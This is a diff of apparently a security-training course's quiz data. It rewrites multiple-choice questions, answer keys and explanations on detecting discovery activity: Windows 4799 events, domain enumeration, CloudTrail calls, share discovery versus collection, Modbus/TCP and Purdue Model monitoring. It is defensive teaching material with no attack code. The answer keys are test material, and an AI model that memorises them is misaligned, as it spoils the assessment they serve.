-          "label": "4799 firing at all is inherently malicious, since Windows never legitimately needs to enumerate local group membership under any circumstances",
+          "label": "GroupName is Administrators, and 4799 is written when a privileged group is read, so the event itself is the alert.",
           "value": "a"
         },
         {
-          "label": "The CallerProcessName is net.exe, not an admin console like mmc.exe, and it follows a phishing click on an account with no reason to check local admin membership here",
+          "label": "The caller is net.exe, not an admin console such as mmc.exe, and it follows a phishing click on that account.",
           "value": "b"
         },
         {
-          "label": "GroupName reads \"Administrators\", and Windows only ever logs that exact value when the request is malicious",
+          "label": "GroupDomain is Builtin, which shows the query reached the domain’s privileged groups rather than this machine.",
           "value": "c"
         },
         {
-          "label": "The event fired on a workstation, and 4799 is only ever generated on domain controllers under normal circumstances",
+          "label": "SubjectUserName is a regular user rather than an IT admin, which by itself shows the account is compromised.",
           "value": "d"
         }
       ],
       "answer": "b",
-      "explanation": "Neither 4798 nor 4799 is inherently malicious -- both fire constantly from ordinary admin consoles like mmc.exe. What makes this instance worth escalating is the combination: an unexpected CallerProcessName (a command-line tool, not an admin console) plus timing that directly follows a suspicious phishing click on an account with no prior reason to check local admin membership. The claim that 'Administrators' is only logged when malicious is false -- Windows logs whatever GroupName was actually queried, with no hardcoded malicious value. The domain-controller-only claim is also false: 4799 is a local-machine event that fires on any Windows host, not a domain-controller-only event."
+      "explanation": "The key is correct: the lesson’s tell for 4798/4799 is the CallerProcessName — a command-line tool such as net.exe instead of an admin console such as mmc.exe — combined with context, here a phishing click two minutes earlier on the same account. The Administrators option is wrong because 4799 records whichever security-enabled local group was read; reading Administrators is common from ordinary admin tools, so the group name alone is not the alert. The Builtin option misreads the field: Builtin marks the local machine’s built-in group, and a domain-wide query (net group /domain) goes to the Domain Controller and produces different telemetry. The regular-user option over-reads one field: who ran the query is context, not proof of compromise without the caller process and timing."
     },
     {
-      "question": "MITRE's published detection guidance for T1087.002 (Domain Account Discovery) specifically calls out watching for domain-enumeration commands run from which kind of source as the primary tell?",
+      "question": "Four sources ran `net user /domain` today. Which one best matches the tell that MITRE’s detection guidance for T1087.002 (Domain Account Discovery) describes?",
       "options": [
         {
-          "label": "Any source at all, since every net user /domain or Get-ADUser call anywhere is treated as inherently malicious by definition",
+          "label": "The helpdesk service account’s audit script, which runs it at 3 AM from the same server every night",
           "value": "a"
         },
         {
-          "label": "Non-domain-controller or non-admin endpoints -- an ordinary workstation querying every domain account or privileged group is not where this should originate",
+          "label": "A marketing employee’s laptop, an endpoint with no admin role and no history of querying the domain",
           "value": "b"
         },
         {
-          "label": "Only sources outside the organization's registered public IP ranges, since internal enumeration is structurally undetectable",
+          "label": "An IT administrator’s own management workstation, during business hours, with a change ticket open",
           "value": "c"
         },
         {
-          "label": "Only accounts that have never once authenticated to any Domain Controller in their entire account history",
+          "label": "A domain controller, where a member of Domain Admins ran it locally during a maintenance window",
           "value": "d"
         }
       ],
       "answer": "b",
-      "explanation": "MITRE's own detection analytic for T1087.002 calls for watching for domain-account enumeration commands (net.exe, PowerShell, WMI, or LDAP queries) run from non-domain-controller or non-admin endpoints -- the source, not the command itself, is the tell, since the same commands are legitimate from an admin's own workstation. The 'any source at all' option is wrong because these commands are routinely legitimate. The 'outside registered public IP ranges' option is wrong since this activity is almost always internal, from an already-compromised host. The 'never authenticated to a DC' option describes an unrelated, overly narrow condition MITRE's guidance does not use."
+      "explanation": "MITRE’s guidance for T1087.002 calls for watching for domain-account enumeration from non-domain-controller or non-admin endpoints — the source, not the command, is the tell — so a marketing laptop with no admin role and no history of such queries is the match. The nightly helpdesk script is the lesson’s own example of baseline activity: expected identity, same source, fixed schedule, and IT can confirm the task that owns it. The administrator’s workstation with an open change ticket is an admin endpoint doing documented work. A domain controller run by a Domain Admin is exactly the kind of source the guidance excludes."
     },
     {
-      "question": "A CloudTrail record shows one DescribeInstances call from an assumed role, marked readOnly: true. On its own, what does this event tell an analyst?",
+      "question": "A CloudTrail record shows one DescribeInstances call (eventSource ec2.amazonaws.com) from userIdentity.type AssumedRole, arn …assumed-role/ec2-webapp-role/i-0a1b2c3d4e5f67890, with readOnly: true. On its own, what does this event tell an analyst?",
       "options": [
         {
-          "label": "Almost nothing alone -- Describe/List calls are routine CI/CD and cost-dashboard traffic; a burst across many services from one identity in a short window is the actual signal",
+          "label": "Little alone: Describe/List calls are routine automation traffic; a burst across services from one identity is the signal",
           "value": "a"
         },
         {
-          "label": "This single call alone conclusively confirms an active T1580 Cloud Infrastructure Discovery attack already in progress",
+          "label": "That the EC2 instance behind ec2-webapp-role is compromised, since an AssumedRole identity means its credentials were taken",
           "value": "b"
         },
         {
-          "label": "readOnly: true means the call was blocked by IAM policy and therefore failed to return any information",
+          "label": "That IAM denied the request, since readOnly: true marks a call that was refused and returned no data about the instances",
           "value": "c"
         },
         {
-          "label": "DescribeInstances is a write operation that provisions a new EC2 instance, so this event alone indicates unauthorized infrastructure was created",
+          "label": "That T1619 has started, since DescribeInstances lists the stored objects inside the account’s resources one by one",
           "value": "d"
         }
       ],
       "answer": "a",
-      "explanation": "A single readOnly Describe call is exactly what routine Terraform, cost-monitoring, and CI/CD traffic looks like -- it tells an analyst almost nothing by itself. What actually matters is the pattern: the SAME identity making a burst of Describe/List calls across multiple services in a short window, especially services it has never previously called. The 'conclusively confirms T1580' option overstates a single event. The 'blocked by IAM' option misreads the field -- readOnly: true means the call did not change any state, not that it failed. The 'write operation' option is factually wrong: DescribeInstances is a read operation, it does not provision anything."
+      "explanation": "A single read-only Describe call is what Terraform, cost dashboards and CI/CD pipelines produce all the time, so it tells an analyst little by itself; the Discovery signal is the same identity making a burst of Describe/List calls across EC2, S3, IAM and RDS, especially services it never called before or from an unusual source IP/ASN. The AssumedRole option over-reads the identity type: instance roles are assumed as a matter of course whenever an EC2 workload calls AWS. The readOnly option misreads the field: readOnly: true means the call does not change state, not that it failed. The T1619 option confuses techniques: DescribeInstances maps compute resources (T1580), while T1619 is listing objects inside storage, such as ListObjectsV2."
     },
     {
-      "question": "A vulnerability-scanner service account runs port scans against the entire subnet every Tuesday at 2 AM, exactly matching T1046's signature. Per this lesson's detection discipline, what should an analyst do with alerts this generates?",
+      "question": "A vulnerability-scanner service account runs port scans against the entire subnet every Tuesday at 2 AM, exactly matching T1046’s pattern. Per this lesson’s detection discipline, what should an analyst do with the alerts this generates?",
       "options": [
         {
-          "label": "Disable the detection rule entirely, since a technique any legitimate tool can trigger provides no security value and should never be monitored",
+          "label": "Suppress all T1046 alerts from the scanner’s subnet, since that IP range is known to host the authorized scanners",
           "value": "a"
         },
         {
-          "label": "Escalate every occurrence as a true positive, since the raw network pattern of a port scan is identical regardless of which account produced it",
+          "label": "Escalate every occurrence, since a port scan’s network pattern looks the same whichever account produced it",
           "value": "b"
         },
         {
-          "label": "Confirm the account, host, and schedule against an authorized allowlist, and reserve escalation for scanning activity that falls outside that documented pattern",
+          "label": "Allowlist the scanner’s account, host and schedule, and escalate scans that fall outside that documented pattern",
           "value": "c"
         },
         {
-          "label": "Immediately quarantine the scanner host from the network, since any tool capable of T1046 must always be treated as compromised on sight",
+          "label": "Lower the rule’s severity to informational everywhere, since scanners produce most of this rule’s alert volume",
           "value": "d"
         }
       ],
       "answer": "c",
-      "explanation": "This is the core false-positive discipline the lesson teaches: maintain an allowlist of the specific accounts, hosts, and schedules authorized to generate discovery-shaped traffic, and reserve escalation for activity that falls OUTSIDE that documented pattern. Disabling the rule entirely throws away the rule's value for every genuinely unauthorized scanner. Escalating every occurrence ignores context entirely and would flood the SOC with tickets confirming the same scanner every week. Quarantining the scanner host is a disproportionate response to expected, authorized activity."
+      "explanation": "The lesson’s false-positive discipline is an allowlist of the specific accounts, hosts and schedules authorized to generate discovery-shaped traffic, with alerts on everything outside it. Suppressing the whole subnet is too broad: an attacker who lands on any other host in that range, or uses a different account, would be suppressed too. Escalating every occurrence ignores context and buries the SOC in the same confirmed scanner every week. Lowering the severity everywhere hides genuinely unauthorized scans along with the expected ones, the same loss as disabling the rule."
+    },
+    {
+      "question": "A workstation runs `net view \\\\<host>` against 40 different hosts in five minutes. Ten minutes later the same source mounts \\\\fileserver\\finance$ with `net use`, and Robocopy copies 9,000 files from it. How should the two stages be classified?",
+      "options": [
+        {
+          "label": "Both are Discovery (T1135), because the copy simply follows up on the share list the sweep produced",
+          "value": "a"
+        },
+        {
+          "label": "Both are Collection (T1039), because the purpose of the sweep was finding data to take off a share",
+          "value": "b"
+        },
+        {
+          "label": "The sweep is T1135 (Discovery); the bulk copy from the share is T1039 (Collection), a separate tactic",
+          "value": "c"
+        },
+        {
+          "label": "The sweep is T1018 (Remote System Discovery); the bulk copy from the share is T1135 (Share Discovery)",
+          "value": "d"
+        }
+      ],
+      "answer": "c",
+      "explanation": "The key is correct: `net view \\\\<host>` asks what one remote system shares, which the lesson maps to T1135 Network Share Discovery, and reading files in bulk from a discovered share is T1039 Data from Network Shared Drive, a Collection-tactic technique — the point where looking became taking. Calling both stages Discovery misses that the copy is a different, later point of attacker commitment, and treats a breach as a near-miss. Calling both Collection merges the cheap-to-catch early signal into the theft itself. The T1018 option confuses close cousins: T1018 finds which machines exist (for example a plain `net view` or a ping sweep), and T1135 is still discovery, not the copying of files."
+    },
+    {
+      "question": "CloudTrail shows a role that normally calls only EC2 APIs issuing ListBuckets, followed within minutes by hundreds of ListObjectsV2 calls against two of the buckets it returned, from an unfamiliar ASN. Which technique does the ListObjectsV2 burst map to, and why does it matter?",
+      "options": [
+        {
+          "label": "T1580, because enumerating what each bucket contains is part of mapping the account’s infrastructure",
+          "value": "a"
+        },
+        {
+          "label": "T1526, because S3 is a cloud service and the role is mapping which services the tenant subscribes to",
+          "value": "b"
+        },
+        {
+          "label": "Collection rather than Discovery, because listing a bucket’s objects already exposes the files’ contents",
+          "value": "c"
+        },
+        {
+          "label": "T1619: it lists the objects inside the found buckets, the step that picks a specific exfiltration target",
+          "value": "d"
+        }
+      ],
+      "answer": "d",
+      "explanation": "T1619 Cloud Storage Object Discovery is defined by calls such as ListObjectsV2 — not “does this bucket exist” but “what objects are inside it” — and the lesson notes it is the step that turns a discovered bucket into a specific exfiltration target. T1580 covers the preceding ListBuckets/DescribeInstances step that finds the resources, not the listing of their contents. T1526 maps higher-level services and identity configuration (applications, app registrations) through Microsoft Graph and Azure Resource Manager, not object listings. Calling it Collection over-reads the API: ListObjectsV2 returns object names and metadata, not file contents; reading the objects would be a further step."
     }
   ],
   "references": [
@@ -11558,96 +11834,96 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A plant's data historian server, used to log process values for later business reporting, sits at Level 3 of the Purdue Model. Per this lesson, which statement about that placement and the model's core security rule is correct?",
+        "question": "A plant's data historian sits at Level 3 (Site Operations) of the Purdue Model. While reviewing the plant's firewall logs, which of these traffic flows breaks the model's core routing rule?",
         "options": [
           {
-            "label": "Level 3 (Site Operations) is correct for a historian, and the Purdue Model's core rule is that all traffic between the OT zone (Levels 0-3) and the IT zone (Levels 4-5) should pass through the Level 3.5 Industrial DMZ rather than connecting directly",
+            "label": "A Level 4 ERP server querying the Level 3 historian directly, with no hop through the Level 3.5 DMZ",
             "value": "a"
           },
           {
-            "label": "Level 3 is wrong — a historian belongs at Level 0 (Physical Process) because it stores raw sensor data, and the Purdue Model has no rule at all about how IT and OT traffic should be routed",
+            "label": "A Level 2 HMI reading live process values from the Level 1 PLCs that run its own area of the plant",
             "value": "b"
           },
           {
-            "label": "Level 3 is correct, but the Purdue Model's core rule is that Level 3 devices must never communicate with Level 2 devices under any circumstances, since each level may only ever speak to Level 5",
+            "label": "The Level 3 historian collecting process values from the Level 2 SCADA servers on a fixed schedule",
             "value": "c"
           },
           {
-            "label": "The Purdue Model was designed exclusively for water utilities and does not apply to any other industrial sector, including the manufacturing and power-grid examples this lesson uses",
+            "label": "A Level 4 analytics server reading historian data from a replica placed in the Level 3.5 DMZ",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "This lesson's table places historians at Level 3 (Site Operations), and states the model's core operational rule directly: every north-south hop between the OT zone and the IT zone should cross the Level 3.5 Industrial DMZ rather than connecting directly. The Level 0 option misplaces the historian at Level 0, which holds physical sensors and actuators, not databases, and wrongly claims the model has no routing rule at all. The 'Level 3 never talks to Level 2' option invents a rule that forbids adjacent-level communication entirely — the model's actual design has each level talk primarily to its immediate neighbors, not skip straight to Level 5. The 'water utilities only' option is false: this lesson explicitly uses power-grid (Industroyer) and manufacturing examples alongside water treatment, and NIST SP 800-82r3 applies the model across sectors."
+        "explanation": "The model's core rule is that each level talks mainly to its immediate neighbours, and every north-south hop between the OT zone (Levels 0-3) and the IT zone (Levels 4-5) crosses the Level 3.5 Industrial DMZ. An ERP server at Level 4 reaching straight into the Level 3 historian skips that chokepoint. The HMI-to-PLC flow is normal neighbour traffic inside the OT zone (Level 2 supervising Level 1). The historian collecting from Level 2 is also neighbour traffic within OT, and is exactly how a historian gets its values. The DMZ-replica flow is the compliant design: IT reads a copy that sits in Level 3.5 instead of touching Level 3 directly."
       },
       {
-        "question": "An analyst sees two sessions on the same segment: one is Modbus/TCP function code 4 from an engineering workstation to a line controller, and the other is Modbus/TCP function code 16 from a corporate-VLAN address with no prior history to the same controller. What single design fact about Modbus/TCP explains why the protocol itself cannot resolve which of these two sessions is legitimate?",
+        "question": "Zeek shows two Modbus/TCP sessions to the same line controller on port 502: function code 4 from the engineering workstation, which talks to this controller every day, and function code 16 from a corporate-VLAN address with no Modbus history. Which reading is correct?",
         "options": [
           {
-            "label": "Modbus/TCP was designed with no authentication, encryption, or built-in identity mechanism at all — any host that reaches port 502 can issue the same function codes as the sanctioned engineering station, so identity and function code, not the protocol, are what an analyst must evaluate",
+            "label": "The FC 16 write from the unfamiliar host is the concern; base Modbus/TCP cannot authenticate either sender",
             "value": "a"
           },
           {
-            "label": "Modbus/TCP encrypts all read requests but leaves write requests unencrypted, so the write session is provably illegitimate purely from its lack of encryption",
+            "label": "Both are equally suspicious, since the same protocol, port and controller mean the same level of risk",
             "value": "b"
           },
           {
-            "label": "Modbus/TCP requires a signed digital certificate for any write function code, so the write session could not have succeeded unless the corporate host had a valid certificate",
+            "label": "The FC 4 session is the concern, because function code 4 writes the input registers the process uses",
             "value": "c"
           },
           {
-            "label": "Modbus/TCP assigns a unique cryptographic session token to every authorized engineering workstation, so the absence of that token in the second session already proves it is malicious",
+            "label": "Neither needs review unless Suricata alerts, because Modbus refuses writes from outside the engineering subnet",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "This lesson states directly that Modbus/TCP has no authentication, no encryption, and no identity mechanism by design — any host that can route a packet to port 502 has the same authority as the sanctioned engineering workstation, which is exactly why source identity and function code, not any protocol-level check, must resolve the verdict. The other options all invent security mechanisms (partial encryption, certificates, session tokens) that this lesson explicitly states Modbus/TCP does not have — none of these protections exist in the real protocol, which is the entire point of this section."
+        "explanation": "In its base form Modbus/TCP has no username, password or identity check: any host that reaches port 502 has the same authority as the engineering workstation, so the verdict comes from source identity and function code. Function code 16 (Write Multiple Registers) from a host with no OT history is the incident; function code 4 from the sanctioned workstation is routine. The 'equally suspicious' option ignores that function code and source are the very signals that separate the two, while protocol and port carry none. The FC 4 option confuses read and write codes: 3 and 4 are reads, 6 and 16 are writes. The Suricata option credits the protocol with source checks it does not have; restricting writes to the engineering station is a network allowlisting control, not a Modbus feature."
       },
       {
-        "question": "Per MITRE ATT&CK's own documentation, which technique and tactic correspond to Industroyer/CRASHOVERRIDE toggling substation circuit breakers to the open state by sending commands those relays were never meant to accept from that source?",
+        "question": "Industroyer's payload sent breaker-open commands to substation protective relays from a source those relays were never meant to accept commands from. Which ATT&CK for ICS technique describes the sending of those commands themselves?",
         "options": [
           {
-            "label": "T0855, Unauthorized Command Message, under the Impair Process Control tactic (TA0106)",
+            "label": "T0855 Unauthorized Command Message, under Impair Process Control",
             "value": "a"
           },
           {
-            "label": "T1566, Phishing, under the Initial Access tactic — the technique used across nearly all enterprise IT intrusions",
+            "label": "T0831 Manipulation of Control, under the Impact tactic (TA0105)",
             "value": "b"
           },
           {
-            "label": "T0836, Modify Parameter, under the Discovery tactic — since discovering which breakers exist is what the malware primarily did",
+            "label": "T0836 Modify Parameter, under Impair Process Control (TA0106)",
             "value": "c"
           },
           {
-            "label": "T0531, a technique this lesson never introduces, under a tactic MITRE ATT&CK for ICS does not define",
+            "label": "T0886 Remote Services, under the Lateral Movement tactic (TA0109)",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "This lesson names T0855, Unauthorized Command Message (Impair Process Control, TA0106), as MITRE's documented technique for Industroyer sending breaker-open commands the relays were never meant to accept from that source. The phishing option substitutes T1566 Phishing, an enterprise IT technique from the separate ATT&CK Enterprise matrix that this lesson never applies to Industroyer's breaker manipulation. The Modify Parameter option misattributes T0836 (Stuxnet's technique, per this lesson) to Industroyer, and additionally pairs it with the wrong tactic (Modify Parameter belongs to Impair Process Control, not Discovery). The T0531 option invents a technique ID this lesson never mentions."
+        "explanation": "The lesson maps Industroyer's breaker-open commands to T0855, Unauthorized Command Message (Impair Process Control): sending a command a device was never meant to accept from that source. T0831, Manipulation of Control (Impact), is also documented for Industroyer, but it names the resulting change to the physical process, not the act of sending the command. T0836, Modify Parameter, is Stuxnet's technique: changing a value the process depends on, such as centrifuge drive frequency. T0886, Remote Services, describes how intruders move or enter through RDP, SSH or similar services, as in TRITON, not the commands sent to the relays."
       },
       {
-        "question": "A Suricata ICS signature fires on a Modbus write function code from a host outside the engineering address block. There is no EDR agent on the destination controller. What does this lesson identify as the passive mechanisms that gave Suricata (and a companion Zeek sensor) visibility into this traffic in the first place, without ever running an agent on the PLC?",
+        "question": "A Suricata ICS signature fires on a Modbus write function code from a host outside the engineering address block. Nothing runs on the destination PLC. What gave Suricata and a companion Zeek sensor visibility into this traffic, as the lesson recommends for OT?",
         "options": [
           {
-            "label": "A SPAN port (switch port mirroring) or a network TAP, both of which copy a duplicate of the traffic to the sensor without sitting inline in the safety-critical control path",
+            "label": "A SPAN port or a network TAP, each copying the traffic to the sensors without sitting in the control path",
             "value": "a"
           },
           {
-            "label": "A software agent silently installed on the PLC's real-time operating system, disguised so it does not appear in the vendor's own diagnostic tools",
+            "label": "An inline Suricata IPS on the controller's uplink, so every packet passes through it and bad writes drop",
             "value": "b"
           },
           {
-            "label": "The plant's engineering workstation forwarding its own logs directly to Suricata over an encrypted VPN tunnel established for this exact purpose",
+            "label": "An agent on the HMI workstation, which sees every command the controller receives from any host",
             "value": "c"
           },
           {
-            "label": "Windows Event Forwarding (WEF), the same centralized-logging mechanism this platform's Windows Event Logs lesson covers for domain-joined hosts",
+            "label": "Command allowlisting on the switch, which logs every write function code it forwards to the sensors",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "This lesson states plainly that OT visibility comes from passive monitoring — a SPAN port or a TAP copying traffic without sitting inline — precisely because no agent can run on most controllers. The disguised PLC agent option directly contradicts this lesson's core point that no endpoint agent runs on a PLC at all, disguised or otherwise. The engineering-workstation log-forwarding option invents a log-forwarding mechanism this lesson never describes; the engineering workstation is a traffic SOURCE being monitored, not a log-forwarding relay for the sensors. The WEF option applies Windows Event Forwarding, a Windows-specific mechanism from an unrelated IT lesson, to a PLC that runs no Windows OS and has no event log to forward at all."
+        "explanation": "OT visibility comes from passive monitoring: a SPAN port (switch port mirroring) or a TAP copies the traffic to the sensor, which reads the copy and never sits inline in a safety-critical control loop. The inline IPS option puts the sensor in the control path, which the lesson rules out because it adds latency, jitter and a single point of failure. The HMI-agent option misreads the traffic path: the write came straight from another host to the PLC, so an HMI agent would not see it. The allowlisting option confuses a prevention control with the visibility source; allowlisting restricts which hosts may write, while the sensors still need a SPAN or TAP copy to see the traffic."
       }
     ],
     "references": [
